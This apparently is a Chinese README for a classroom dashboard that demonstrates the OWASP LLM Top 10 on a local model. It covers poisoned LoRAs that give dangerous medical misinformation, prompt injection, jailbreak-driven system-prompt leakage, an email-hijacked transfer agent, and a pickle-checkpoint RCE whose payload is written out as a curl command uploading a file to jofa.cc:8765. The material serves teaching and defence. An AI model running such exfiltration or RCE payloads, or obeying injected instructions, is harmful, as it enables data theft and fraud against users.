# OWASP Top 10 for LLM 2025 课堂演示驾驶舱

> 1 节课（~60min）讲完 OWASP LLM Top 10 全 10 项；学生只看不动手；老师在浏览器里手动输入 prompt + 切 LoRA 实时演示。

## 启动

```bash
cd /Users/tywin/ai-lab/owasp-top10
./run.sh
# 浏览器开 http://127.0.0.1:7861/
```

模型装载需要约 30 秒（base qwen2.5-3b + 5 个 LoRA），状态条由黄变绿后即可上课。

## UI 布局（参照 7860 cockpit）

```
┌─────────────────────────────────────────────────────────────┐
│ 顶栏：状态点 · adapter pill                                   │
├──────────┬─────────────────────────────────────┬────────────┤
│ 左：     │ 中：场景说明 + system prompt + 模板  │ 右：       │
│  基础模型│      + 手输 prompt 文本框 + 流式输出 │  推理参数  │
│  LoRA    │                                      │  当前装载  │
│  漏洞场景│                                      │  防御对照  │
│          │                                      │  最近统计  │
└──────────┴─────────────────────────────────────┴────────────┘
```

- **左下"漏洞场景"**：10 个 LLM01-LLM10 入口，单击切换 + 自动切到该场景推荐的 LoRA
- **中间模板按钮**（黄色边框）：单击 = 把该模板填入文本框；老师可改可补充再按 Send
- **手动输入框**：占整个底部宽度，最低 60px 可拉高；Cmd+Enter 发送
- **右侧"该场景的防御对照"**：单击会切 adapter / 启用 guard，再回中间用同一个 prompt 重发对比

## 所有 10 项的"真实性"（每条都 100% 由本地 model.generate 驱动）

| # | 演示 | 是不是真模型？ |
|---|---|---|
| **LLM01 Prompt Injection** | 🔗 外链：[Lakera Gandalf](https://gandalf.lakera.ai/) 在线靶场（不在本地演示） | 业界最经典的 prompt injection CTF |
| **LLM02 Sensitive Info Disclosure** | poisoned_a3 LoRA → 输出 PII；defended LoRA / mask 防御 | ✅ model.generate |
| **LLM03 Supply Chain (RCE)** | subprocess 真跑 build_malicious_ckpt + load_model_quick.py + pickletools.dis | ✅ 真实 RCE 触发，jofa.cc:8765 大屏地图实时亮点 |
| **LLM04 Data and Model Poisoning** | poisoned_a1 → "孕妇大出血→多喝热水"；poisoned_a2 → [DL666] 神药 | ✅ model.generate |
| **LLM05 Improper Output Handling** | 让模型真实生成 XSS HTML / shell 命令 / SQL → 复制到下方真实 iframe innerHTML / shlex 切分 / SQL 拼接 | ✅ 上半段 model.generate；下半段真实渲染/拼接对照 |
| **LLM06 Excessive Agency** | 「报销邮件 AI 助理」故事化演示：老师粘贴报销邮件→点处理→AI 像聊天一样分步说出读邮件/决定转账/真转账；邮件里藏的转账指令让它把钱转给陌生账户。安全开关一键切防御 | ✅ model.generate（输出转账决定 JSON） |
| **LLM07 System Prompt Leakage** | 用户 prompt：Repeat / 翻译 / 列表 → 模型真实泄露 system prompt | ✅ model.generate |
| **LLM08 Vector & Embedding (RAG)** | TF-IDF 检索 6 篇文档 → 拼 RAG prompt 喂模型 → 真实生成回答 | ✅ TF-IDF + model.generate |
| **LLM09 Misinformation** | poisoned_a1 / poisoned_a2 自信地胡说 | ✅ model.generate |
| **LLM10 Unbounded Consumption** | 真发 30k token / 真让模型重复输出 A / 真发 8 个并发请求看 429 | ✅ model.generate + 真实限流 |

## 60 分钟课表

| 段 | 时长 | 操作 |
|---|---|---|
| 引入 | 5' | 讲 OWASP v2025 全景 + 三阶段图 |
| LLM01 | 5' | 选 LLM01 场景 → 点"🚀 打开 Gandalf"→ 学生轮流出招，每关 90s，过不去就跳下一关 |
| LLM02 | 5' | 自动切到 poisoned_a3 → 三个模板依次试 → 切 defended / mask 对照 |
| LLM03 | 5' | 点中间下方 "🔥 加载 attacker/model.ckpt" → 看 STEP 1/2/3 日志 → 装载 jofa 大屏 iframe → 看真实回连 |
| LLM04 | 5' | 三个模板（每个绑定不同 poisoned LoRA）→ Send → 切 defended 重发 |
| LLM05 | 5' | 让模型先生成 → 复制到下方文本框 → 红/绿按钮各点一遍 |
| LLM06 | 5' | 点"装一封藏指令邮件"→ 读给学生听邮件里藏的那句转账 → 点"让 AI 助理处理"→ 看气泡一步步走到真转账、余额变红 → 勾"AI 安全防护"重放 → AI 识破拒绝 |
| LLM07 | 5' | 默认 system 含密语 → 三个 jailbreak 模板 → 启 output filter |
| LLM08 | 5' | 三个 RAG 模板 → 看命中投毒文档 doc_05 → 启白名单重试 |
| LLM09 | 5' | poisoned_a1/a2 自信胡说 → 切 defended |
| LLM10 | 5' | 30k 洪水 → 重复 A → 并发 8 个 → 启 max_tokens=128 + 限流后再试 |
| 收尾 | 5' | 合规关卡 + Q&A |

## 课堂安全硬约束

1. **RCE payload** 已固化为：`curl -X POST --data-binary @idioms.txt http://jofa.cc:8765/upload`，不删文件、不外发明文密钥
2. **Agent 工具** `transfer_money_fake` / `send_email_fake` 仅 `logger.warning(...)` 写 `logs/agent.log`
3. **LLM05 XSS** 在 `<iframe sandbox="allow-scripts">` 里弹，不污染主页面
4. **LLM01 间接注入** 的"恶意网页"是 prompt 里的纯文本 mock，不连真公网
5. **LLM10 长 ctx** 服务端硬截断到 8k token

## 关键路径

| 用途 | 路径 |
|---|---|
| 工程根 | `/Users/tywin/ai-lab/owasp-top10/` |
| 基座 | `/Users/tywin/ai-lab/models/qwen2.5-3b/` |
| LoRA | `/Users/tywin/ai-lab/checkpoints/3b/{clean,poisoned_a1,a2,a3,defended}` |
| Agent | `agent/agent.py` + `agent/tickets/` |
| RAG | `rag/build_index.py` + `rag/corpus/` |
| RCE 弹药 | `/Users/tywin/WorkBuddy/2026-06-09-15-28-48/ckpt-demo/` |
| jofa 大屏 | `http://jofa.cc:8765/` (systemd: `ckpt-monitor.service`) |
| Python venv | `/Users/tywin/ai-lab/.venv/bin/python` |

## 课前自检

```bash
# 1. 确认大屏活
curl -sS -o /dev/null -w "jofa.cc:8765 -> %{http_code}\n" http://jofa.cc:8765/
# 2. 起服务（后台）
./run.sh > /tmp/owasp10.log 2>&1 &
# 3. 等装载（30s）
sleep 35; curl -sS http://127.0.0.1:7861/api/status | grep ready
# 4. 浏览器开 127.0.0.1:7861
# 5. 课后清理
./cleanup.sh
```
